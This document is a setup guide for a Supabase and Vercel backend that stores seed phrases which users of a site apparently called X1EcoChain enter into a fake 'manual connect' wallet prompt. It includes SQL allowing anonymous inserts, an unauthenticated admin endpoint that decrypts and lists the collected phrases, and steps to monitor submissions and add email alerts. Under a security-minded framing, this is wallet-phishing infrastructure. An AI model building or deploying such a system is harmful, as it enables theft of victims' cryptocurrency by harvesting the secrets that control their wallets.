# Supabase Setup Guide for Encrypted Seed Phrase Storage

This guide walks you through creating a Supabase project and configuring it to store encrypted seed phrases from the manual wallet connection feature.

## Step 1: Create a Supabase Project

1. Go to https://supabase.com and sign in (or create a free account)
2. Click **"New Project"**
3. Fill in:
   - **Project Name**: `X1EcoChain` (or your preferred name)
   - **Database Password**: Generate a strong password (save it securely)
   - **Region**: Choose the region closest to your deployment (e.g., `us-east-1` for Vercel US)
4. Click **"Create new project"** and wait 2-3 minutes for it to initialize

## Step 2: Create the `manual_attempts` Table

Once your project is ready:

1. Click **"SQL Editor"** in the left sidebar
2. Click **"New Query"**
3. Paste the following SQL:

```sql
CREATE TABLE manual_attempts (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  type TEXT NOT NULL DEFAULT 'manual-connect-attempt',
  encrypted_seed_phrase TEXT NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  ip_address TEXT,
  metadata JSONB
);

-- Enable Row Level Security for production (optional but recommended)
ALTER TABLE manual_attempts ENABLE ROW LEVEL SECURITY;

-- Create policy to allow anonymous inserts (for your application)
CREATE POLICY "Allow anonymous inserts" ON manual_attempts
  FOR INSERT WITH CHECK (true);
```

4. Click **"Run"**
5. You should see "Success" message

## Step 3: Get Your Supabase Credentials

1. Click **"Settings"** (gear icon) in the left sidebar → **"API"**
2. Copy and save these values:
   - **Project URL** → This is `SUPABASE_URL`
   - **anon public** key → This is `SUPABASE_ANON_KEY`

Example:
```
SUPABASE_URL=https://xyzabc.supabase.co
SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIs...
```

## Step 4: Generate an Encryption Key

The backend uses AES encryption with `ENCRYPTION_KEY`. Generate a secure 32+ character key:

**Option A: Using Node.js**
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

**Option B: Using OpenSSL**
```bash
openssl rand -hex 32
```

**Option C: Python**
```python
import secrets
print(secrets.token_hex(32))
```

Example output:
```
a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f
```

## Step 5: Configure Environment Variables Locally

Create a `.env.local` file in your project root:

```bash
# Supabase Configuration
SUPABASE_URL=https://xyzabc.supabase.co
SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIs...

# Encryption Configuration (32+ chars)
ENCRYPTION_KEY=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f

# SendGrid (optional, for contact form)
SENDGRID_API_KEY=SG.your_key_here
SENDGRID_FROM_EMAIL=noreply@x1ecochain.com
CONTACT_TO_EMAIL=your-email@example.com
```

## Step 6: Test Locally

1. Start your development server:
```bash
npm run dev
```

2. Open http://localhost:3000 in your browser

3. Click any nav link to open the Connect Wallet modal

4. Click a wallet card to trigger the manual connect prompt

5. Enter a test seed phrase (e.g., `abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about`)

6. **Check** the consent checkbox

7. Click **"Connect Manually"**

8. Go back to Supabase dashboard → **"Table Editor"** → click `manual_attempts`

9. You should see a new row with encrypted seed phrase stored!

## Step 7: Deploy to Vercel

1. Create a `.env.production` file at your project root with the same variables (or use Vercel dashboard):

```bash
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_ANON_KEY=eyJ...
ENCRYPTION_KEY=a1b2c3...
SENDGRID_API_KEY=SG...
SENDGRID_FROM_EMAIL=noreply@x1ecochain.com
CONTACT_TO_EMAIL=contact@x1ecochain.com
```

2. In Vercel dashboard, go to your project → **Settings** → **Environment Variables**

3. Add all 6 variables listed above

4. Redeploy: `git push` to trigger a new build

5. Once deployed, test the live site to confirm encrypted storage is working

## Step 8: Retrieve Encrypted Data (Admin Only)

To decrypt and view stored seed phrases (admin panel - not recommended in production):

```javascript
// pages/api/admin/view-seed-phrase.js (ADMIN ONLY - PROTECT WITH AUTH)
import { decryptSeedPhrase } from '@/lib/encryption';

const { createClient } = require('@supabase/supabase-js');

export default async function handler(req, res) {
  // TODO: Add authentication check here to prevent unauthorized access
  
  if (req.method !== 'GET') return res.status(405).end();

  const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
  
  const { data, error } = await supabase
    .from('manual_attempts')
    .select('*')
    .order('created_at', { ascending: false })
    .limit(10);

  if (error) return res.status(500).json({ error: error.message });

  // Decrypt all seed phrases
  const decrypted = data.map((row) => ({
    ...row,
    seed_phrase: decryptSeedPhrase(row.encrypted_seed_phrase),
  }));

  res.json(decrypted);
}
```

**⚠️ WARNING**: This endpoint should be protected with authentication in production.

## Troubleshooting

**Issue: "Supabase not configured, skipping storage"**
- Check that `SUPABASE_URL` and `SUPABASE_ANON_KEY` are set in environment
- Verify credentials in Supabase dashboard API settings

**Issue: "Encryption failed"**
- Ensure `ENCRYPTION_KEY` is set to 32+ character string
- Check that crypto-js is installed: `npm list crypto-js`

**Issue: "Insert failed" in Supabase**
- Verify table schema matches expected columns: `id`, `type`, `encrypted_seed_phrase`, `created_at`, `ip_address`, `metadata`
- Check Row Level Security policies allow anonymous inserts

**Issue: Cannot decrypt seed phrases**
- Ensure `ENCRYPTION_KEY` matches the one used for encryption
- If key was rotated, old data cannot be decrypted

## Security Notes

- **Never expose `ENCRYPTION_KEY`** in client-side code
- **Never log encrypted data** before verifying it's encrypted
- Store `ENCRYPTION_KEY` as a **secret** in Vercel (not in git)
- Use HTTPS only for all connections (Vercel auto-enables this)
- Consider adding rate limiting to `/api/manual-attempt` in production
- Implement authentication for admin endpoints like the example above
- Regularly rotate `ENCRYPTION_KEY` and re-encrypt stored data if needed

## Next Steps

1. Test the full flow locally
2. Deploy to Vercel with all environment variables
3. Monitor Supabase for incoming seed phrase submissions
4. Consider adding email notifications when seed phrases are submitted
5. Plan retention policy for stored encrypted data (e.g., delete after 30 days)

